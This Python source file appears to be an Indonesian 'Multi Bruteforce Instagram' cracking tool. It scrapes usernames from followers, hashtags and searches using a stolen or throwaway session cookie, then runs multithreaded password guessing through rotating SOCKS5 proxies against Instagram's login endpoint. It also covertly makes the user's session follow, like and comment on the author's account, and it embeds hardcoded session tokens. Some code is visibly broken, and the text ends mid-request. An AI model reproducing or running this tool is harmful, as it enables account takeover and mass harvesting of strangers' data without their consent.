import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep

# Warna
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
                                                                                                                            
#LOGO
___logo___ = (f"""{H}
{A}╔════════════════════════════════════════════════════════════════════════════════════════╗
{A}║                                                                                        ║
{A}║                                                                                        ║
{A}║                                                                                        ║
{A}║  {O}██╗{H}███╗   ██╗{K}███████╗{P}████████╗ {M}█████╗        {J}██████╗{U}██████╗  {H}█████╗  {O}██████╗{K}██╗  ██╗  {A}║
{A}║  {O}██║{H}████╗  ██║{K}██╔════╝{P}╚══██╔══╝{M}██╔══██╗      {J}██╔════╝{U}██╔══██╗{H}██╔══██╗{O}██╔════╝{K}██║ ██╔╝  {A}║
{A}║  {O}██║{H}██╔██╗ ██║{K}███████╗   {P}██║   {M}███████║{B}█████╗{J}██║     {U}██████╔╝{H}███████║{O}██║     {K}█████╔╝   {A}║
{A}║  {O}██║{H}██║╚██╗██║{K}╚════██║   {P}██║   {M}██╔══██║{B}╚════╝{J}██║     {U}██╔══██╗{H}██╔══██║{O}██║     {K}██╔═██╗   {A}║
{A}║  {O}██║{H}██║ ╚████║{K}███████║   {P}██║   {M}██║  ██║      {J}╚██████╗{U}██║  ██║{H}██║  ██║{O}╚██████╗{K}██║  ██╗  {A}║
{A}║  {O}╚═╝{H}╚═╝  ╚═══╝{K}╚══════╝   {P}╚═╝   {M}╚═╝  ╚═╝       {J}╚═════╝{U}╚═╝  ╚═╝{H}╚═╝  ╚═╝ {O}╚═════╝{K}╚═╝  ╚═╝  {A}║
{A}║                                                                                        {A}║
{A}║                                                                {A}VERSION{P}: {H}UNLIMITED{A}-{K}777  {A}║
{A}║                                                                                        {A}║
{A}╚════════════════════════════════════════════════════════════════════════════════════════╝

{A}╔════════════════════════════════════════════════════════════════════════════════════════╗
{A}║                            {O} MULTI {K}BRUTEFORCE {U}INSTAGRAM                                 {A}║
{A}║                            {A} AUTHOR    {P}: {H}MN4WN-777                                      {A}║
{A}║                            {A} Github    {P}: {H}github.com/MN4WN1-777                          {A}║
{A}║                            {A} Facebook  {P}: {H}Zeuz Toktok                                    {A}║
{A}╚════════════════════════════════════════════════════════════════════════════════════════╝
""")                                                                                                         

# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    print(f"{A}╔════════════════════════════════════════════════════════════════════════════════════════╗")
    print(f"{A}║                                                                                        {A}║")
    print(f"{A}║ {A} [{H}❖{H}{A}] {J} GUNAKAN COOKIE AKUN TUMBAL INSTAGRAM ANDA {M}!!!                                    {A}║")
    print(f"{A}║ {A} [{H}❖{H}{A}] {A} CARA AMBIL COOKIE KETIK {Z}[{H}OPEN{Z}]{A}                                                   {A}║")
    print(f"{A}║                                                                                        {A}║")
    print(f"{A}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    ___cookie = input(f"{J}╚═➣{H} MASUKAN COOKIE :{A} ")
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{A}╚═➣{M} You will be directed to the creator of this program !!!");sleep(3);os.system('xdg-open https://wa.me/+6282316671302?text=Bg+Cara+Ambil+Cookies+Ig+Kek+Mana?');___login___()
    elif ___cookie in ['', ' ']:
        exit(f"{A}[{J}!{A}]{M} Do not Empty")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
            os.system('xdg-open https://wa.me/+6282316671302?text=MAKASIH+BANG+SUDAH+AKTIFIN+ID+GUA')
            print(f"{A}╚═➣{A} Welcome :{H} {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{A}╚═➣{M} COOKIE ANDA KADARLUARSA SILAHKAN PERBARUI TERLEBIH DAHULU !!!")
        except (ConnectionError):
            exit(f"{A}[{J}!{A}]{J} Connection Error")
# Follow Cookie
def ___follow___():
    try:
        ___cookie = open('main/coki.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['Hello And Welcome ❤️'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
            if '"status":"ok"' in str(___follow):
                print(f"{J}╚═➣{H} LOGIN BERHASIL");___menu___()
            else:
                print(f"{J}╚═➣{M} COOKIE INVALID !!!");sleep(3);os.system('rm -rf main/coki.txt');___login___()
    except Exception as e:
        print(f"{J}╚═➣{M} COOKIE INVALID !!!");sleep(3);os.system('rm -rf main/coki.txt');___login___()
# Menu
def ___menu___():
    try:
        os.system('clear')
        print(___logo___)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("main/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('main/coki.txt','r').read()}).json()['user']
        print(f"{A}╔════════════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{A}║ [{J}*{A}]{J} Welcome  {P}:{J} {___roz['full_name']}                                                                        {A}║")
        print(f"{A}║ [{J}*{A}]{J} User     {P}:{J} {___roz['username']}                                                                {A}║")
        print(f"{A}║ [{J}*{A}]{J} Follower {P}:{J} {___roz['follower_count']}                                                                       {A}║")
        print(f"{A}║ [{J}*{A}]{J} Status   {P}:{H} PREMIUM                                                                 {A}║")
        print(f"{A}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    except (IOError):
        print(f"{A}╚═➣{M} COOKIE INVALID !!!");sleep(3);___login___()
    except (KeyError):
        print(f"{A}╚═➣{M} COOKIE INVALID !!!");os.system('rm -rf main/coki.txt && rm -rf main/user.txt');sleep(3);___login___()
    except (IOError):
        exit(f"{A}[{J}!{A}]{J} Connection Error")
    print(f"{A}╔════════════════════════════════════════════════════════════════════════════════════════╗")
    print(f"{A}║                                           {A}║                                            {A}║")
    print(f"{A}║ {A}[{J}1{A}]{A} Dump Username From {H}Following          {A}║  {A}[{J}7{A}]{A} Dump Username From {H}Query              {A}║")
    print(f"{A}║ {A}[{J}2{A}]{A} Dump Username From {H}Followers          {A}║  {A}[{J}8{A}]{A} Dump User {H}From Email                  {A}║")
    print(f"{A}║ {A}[{J}3{A}]{A} Dump Username From {H}Activity           {A}║  {A}[{J}9{A}]{A} Start Crack {A}[{H}Fast{A}]{H}                    {A}║")
    print(f"{A}║ {A}[{J}4{A}]{A} Dump Username From {H}Home               {A}║  {A}[{J}0{A}]{A} List Total {A}Crack                      {A}║")
    print(f"{A}║ {A}[{J}5{A}]{A} Dump Username From {H}Hashtag            {A}║  {A}[{J}A{A}]{A} Log out {A}[{M}Exit{A}]{M}                        {A}║")
    print(f"{A}║ {A}[{J}6{A}]{A} Dump Username From {H}Search             {A}║                                            {A}║")
    print(f"{A}║                                           {A}║                                            {A}║")
    print(f"{A}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    ___pilih = input(f"{A}║ {A}[{H}?{A}]{H} Choose {P}:{J} ")
    if ___pilih in ['1','01']:
        ___mengikuti___()
    elif ___pilih in ['2','02']:
        ___pengikut___()
    elif ___pilih in ['3','03']:
        ___activity___()
    elif ___pilih in ['4','04']:
        ___beranda___()
    elif ___pilih in ['5','05']:
        ___hastag___()
    elif ___pilih in ['6','06']:
        ___search___()
    elif ___pilih in ['7','07']:
        ___query___()
    elif ___pilih in ['8','08']:
        ___email___()
    elif ___pilih in ['9','09']:
        ___proxy___()
    elif ___pilih in ['0','00']:
        try:
            print(f"{A}║ [{J}1{A}]{H} Total Ok")
            print(f"{A}║ [{J}2{A}]{J} Total Cp")
            print(f"{A}║ [{J}3{A}]{M} Return")
            ___hasil = input(f"{A}║ [{H}?{A}]{J} Choose :{H} ")
            if ___hasil in ['1','01']:
                print(f"{H} ");os.system('cat Results/Ok.txt')
            elif ___hasil in ['2','02']:
                print(f"{J} ");os.system('cat Results/Cp.txt')
            elif ___hasil in ['3','03']:
                ___menu___()
            else:
                print(f"{A}[{M}!{A}]{M} Wrong Input");sleep(2);___menu___()
        except:pass
    elif ___pilih in ['a','A']:
        print(f"{A}[{M}!{A}]{J} Delete Cookie...");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(2);___login___()
    else:
        print(f"{A}[{M}!{A}]{M} Wrong Input");sleep(2);___menu___()
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"{A}║ [{H}?{A}]{J} User :{H} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{A}[{M}!{A}]{M} use Username")
        else:
            ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{A}║ [{H}✔{A}]{J} Name :{H} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{A}{z['username']}<=>{z['full_name']}")
            print(f"\n{A}[{J}*{A}]{H} Finished...")
            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
            input(f"{A}[{J}Return{A}]{H}");___menu___()
    except (KeyError):
        print(f"{A}[{M}!{A}]{M} Dump Fail");sleep(2);___menu___()
    except (ConnectionError):
        exit(f"{A}[{M}!{A}]{M} Connection Error")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\n{A}[{H}?{A}]{J} User :{H} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{A}[{M}!{A}]{M} use Username")
        else:
            ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{A}[{H}?{A}]{J} Name :{H} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://z-p42.www.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{A}{z['username']}<=>{z['full_name']}")
            print(f"\n{A}[{J}*{A}]{H} Finished...")
            print(f"{A}[{H}?{A}]{J} File Saved in :{H} Dump/{___file}")
            input(f"{A}[{J}Return{A}]{H}");___menu___()
    except (KeyError):
        exit(f"{A}[{M}!{A}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{A}[{M}!{A}]{M} Connection Error")
# Dump Activity
def ___activity___():
    try:
        ___file = input(f"\n{A}[{H}?{A}]{J} Name File :{H} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{A}[{M}!{A}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get('https://z-p42.www.instagram.com/accounts/activity/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{A}[{J}*{A}]{H} Finisehd...")
            print(f"{A}[{H}?{A}]{B} File Saved in :{U} Dump/{___file}")
            input(f"{A}[{J}Return{A}]{H}");___menu___()
    except Exception as e:
        exit(f"{A}[{M}!{A}]{M} {e}")
# Dump Beranda
def ___beranda___():
    try:
        ___file = input(f"\n{A}[{H}?{A}]{J} Name File :{H} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{A}[{M}!{A}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['tray']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{A}[{J}*{A}]{H} Finished...")
            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
            input(f"{A}[{J}Return{A}]{H}");___menu___()
    except (KeyError):
        exit(f"{A}[{M}!{A}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{A}[{M}!{A}]{J} Connection Error")
# Dump Hastag
def ___hastag___():
    try:
        ___tag = input(f"\n{A}[{H}?{A}]{J} Hashtag :{H} ").replace('#','')
        if ___tag in ['',' ']:
            exit(f"{A}[{M}!{A}]{M} Fill")
        ___file = input(f"{A}[{H}?{A}]{J} Name File :{H} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{A}[{M}!{A}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get(f'https://z-p42.www.instagram.com/explore/tags/{___tag}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{A}[{J}*{A}]{H} Finished...")
            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
            input(f"{A}[{J}Return{A}]{H}");___menu___()
    except Exception as e:
        exit(f"{A}[{M}!{A}]{J} {e}")
# Dump Search
def ___search___():
    try:
        ___user = input(f"\n{A}[{H}?{A}]{J} User :{H} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{A}[{M}!{A}]{M} Use Username")
        else:
            ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{A}[{H}?{A}]{B} Name :{H} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{A}[{J}*{A}]{H} Finished...")
            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
            input(f"{A}[{J}Return{A}]{H}");___menu___()
    except (KeyError):
        exit(f"{A}[{M}!{A}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{A}[{M}!{A}]{J} Connection Error")
# Dump Query
def ___query___():
    try:
        ___query = input(f"\n{A}[{H}?{A}]{J} Query :{H} ")
        if ___query in ['',' ']:
            exit(f"{A}[{M}!{A}]{M} Fill")
        else:
            print(f"{A} ")
            ___file = ___query.replace(' ','_')+'.txt'
            ___roz = requests.get(f'https://z-p42.instagram.com/web/search/topsearch/?context=blended&query={___query}&rank_token=0.3953592318270893&count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['users']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{A}[{J}*{A}]{H} Finished...")
            print(f"{A}[{H}?{A}]{J} File Saved in :{H} Dump/{___file}")
            input(f"{A}[{J}Return{A}]{H}");___menu___()
    except (KeyError):
        exit(f"{A}[{M}!{A}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{A}[{M}!{A}]{J} Connection Error")
# Dump Dari Email
def ___email___():
    try:
        ___nama = input(f"\n{A}[{H}?{A}]{J} Name :{H} ").replace(' ','')
        if ___nama in ['',' ']:
            exit(f"{A}[{M}!{A}]{M} Fill")
        ___domain = input(f"{A}[{H}?{A}]{J} Domain :{H} ")
        if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___limit = int(input(f"{A}[{H}?{A}]{J} Limit :{H} "))
            if ___limit >=1001:
                exit(f"{A}[{M}!{A}]{M} maximun 1000")
            else:
                print(f"{A} ")
                ___file = 'Dump/'+___nama+'.txt'
                for _ in range(___limit):
                    ___nomor = random.randint(1, 999)
                    ___user = ___nama + str(___nomor) + ___domain + '<=>' + ___nama + ' ' + str(___nomor)
                    open(___file, 'a').write(f'{___user}\n')
                    print(f"{___user}")
                print(f"\n{A}[{J}*{A}]{H} Finished...")
                print(f"{A}[{H}?{A}]{J} File Saved in :{H} {___file}")
                input(f"{A}[{J}Return{A}]{H}");___menu___()
        else:
            exit(f"{A}[{M}!{A}]{H} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
    except Exception as e:
        exit(f"{A}[{M}!{A}]{M} {e}")
# Proxy
def ___proxy___():
    try:
        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('Data/proxy2.txt', 'w').write(___roz)
    except Exception as e:
        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"{A}╔════════════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{A}║                                                                                        {A}║")
        print(f"{A}║ [{J}1{A}]{J} Enter {A}Password {A}[ {H}Name, Name123, Name12345 {A}]                                        {A}║")
        print(f"{A}║ [{J}2{A}]{J} Enter {A}Password {A}[ {H}name, name123, name1234, name12345 {A}]                              {A}║")
        print(f"{A}║ [{J}3{A}]{J} Enter {A}Password {A}[ {J}name, name123, name1234, name12345, name123456 {A}]                  {A}║")
        print(f"{A}║ [{J}4{A}]{J} Enter {A}Password {A}{H}Manual{P}: {A}[ {H}bismillah, katasandi, cantik123 {A}]                         {A}║")
        print(f"{A}║                                                                                        {A}║")
        print(f"{A}╚════════════════════════════════════════════════════════════════════════════════════════╝")
        ___pilih = input(f"{A}║ [{H}?{A}]{H} Choose {P}:{J} ")
        if ___pilih in ['4','04']:
            pwx = input(f"{A}║ [{H}?{A}]{H} Password :{J} ").split(',')
        try:
            self.___dump = input(f"{A}║ [{H}?{A}]{J} File Dump :{H} ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            print(f"{A}║ [{M}!{A}]{M} File Not Found");sleep(2);___menu___()
        try:
            print(f"\n{A}║ [{J}•{A}]{H} Total Ok Saved Di Results/Ok.txt")
            print(f"{A}║ [{J}•{A}]{J} Total Cp Saved Di Results/Cp.txt")
            print(f"{A}║ [{J}•{A}]{O} JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 10 DETIK {M}!!!\n")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split('<=>')
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'12345']
                    elif ___pilih in ['2','02']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    elif ___pilih in ['3','03']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
                    elif ___pilih in ['4','04']:
                        password = pwx
                    else:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit(f"\n{A}╚═➣ [{H}Finished{A}]{J}")
        except (ValueError):
            exit(f"{P}[{M}!{P}]{M} Crack is complete, there seems to be an error, please re-dump!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Data/ua.txt', 'r').read()
        except (IOError):
            ___useragent = random.choice[___ua1][___ua2]
            ___ua1 = ('Mozilla/5.0 (Linux; Android 12; SO-53B Build/61.1.C.2.158; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 Instagram 244.1.0.19.110 Android (31/12; 420dpi; 1080x2394; Sony/docomo; SO-53B; SO-53B; qcom; ja_JP; 384108453)')
            ___ua2 = ('Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 Instagram 86.0.0.24.87 Android (26/8.0.0; 480dpi; 1080x2040; HUAWEI; RNE-L21; HWRNE; hi6250; ru_RU; 147375143)')
            ___roz = requests.get('Instagram 141.0.0.17.118 Android (29/10; 450dpi; 1080x2192; samsung; SM-G986U; y2q; qcom; en_US; 213368022)')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://z-p42.www.instagram.com/')
                ___login = ('https://i.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks5://%s'%(random.choice(open("Data/proxy2.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
                'x-csrftoken': ___csrf}
